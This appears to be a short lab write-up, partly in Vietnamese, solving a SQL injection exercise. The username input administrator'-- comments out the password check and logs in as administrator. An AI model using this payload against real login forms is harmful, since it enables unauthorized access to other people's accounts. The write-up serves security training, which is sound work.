@@ -1,0 +1,28 @@
+This lab contains a SQL injection vulnerability in the login function.
+
+To solve the lab, perform a SQL injection attack that logs in to the application as the 'administrator' user.
+
+Ví dụ: 
+
+Câu truy vấn bình thường của form đăng nhập
+
+SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
+
+Thì khi ta muốn chèn 1 đoạn sql để nó lấy mỗi username và bỏ qua password:
+
+ SELECT * FROM users WHERE username = 'wiener'--' AND password = 'bluecheese'
+
+ Tương tự với tài khoản administrator
+
+ SELECT * FROM users WHERE username = 'administrator'--' AND password = 'bluecheese'
+
+ Với form tài khoản thì t nhập:
+
+ administrator'--
+
+ Còn mật khẩu thì ta viết đại 1 số:
+
+ 1
+
+ =>> Thành công
+ 
